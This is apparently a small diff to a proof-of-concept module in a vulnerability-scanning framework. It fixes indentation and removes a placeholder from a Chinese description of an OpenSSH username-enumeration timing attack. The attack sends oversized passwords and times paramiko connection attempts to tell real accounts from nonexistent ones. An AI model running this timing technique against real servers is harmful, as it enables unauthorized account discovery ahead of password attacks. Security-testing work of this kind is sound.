@@ -12,7 +12,7 @@ class Vuln(ABVuln):
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
     disclosure_date = ''  # 漏洞公布时间
-    desc = '''模版漏洞描述
+    desc = '''
     当我们使用不存在的用户名去连接ssh服务器时，SSHD会基于BLOWFISH算法去生成一个假的密码，但如果使用存在的用户名，
     SSHD会使用SHA256/SHA512算法对密码进行加密。所以我们发送一个超大密码（>10KB），
     SHA256算法计算时间就远长于BLOWFISH算法的假密码。所以基于这个原理，我们可以枚举ssh用户名。
@@ -36,9 +36,9 @@ class Poc(ABPoc):
         starttime=time.time()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-                ssh.connect(ip, username=user,password=password)
+            ssh.connect(ip, username=user,password=password)
         except:
-                endtime=time.time()
+            endtime=time.time()
         return endtime-starttime
 
     def verify(self):
